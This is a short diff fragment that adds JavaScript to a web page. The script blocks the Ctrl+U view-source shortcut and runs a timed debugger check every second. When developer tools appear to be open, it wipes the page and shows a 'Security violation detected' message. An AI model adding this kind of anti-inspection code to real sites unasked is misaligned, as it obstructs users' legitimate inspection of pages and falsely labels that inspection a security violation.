+                if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) { return false; } // Ctrl+U
+            };
+
+            // Basic DevTools detector
+            setInterval(function () {
+                var before = new Date().getTime();
+                debugger;
+                var after = new Date().getTime();
+                if (after - before > 100) {
+                    document.body.innerHTML = "<div style='text-align:center; padding: 2rem;'><strong>Security violation detected.</strong> Please close developer tools to use this application.</div>";
+                }
+            }, 1000);
+        })();
+    </script>
+</body>
+
+</html>
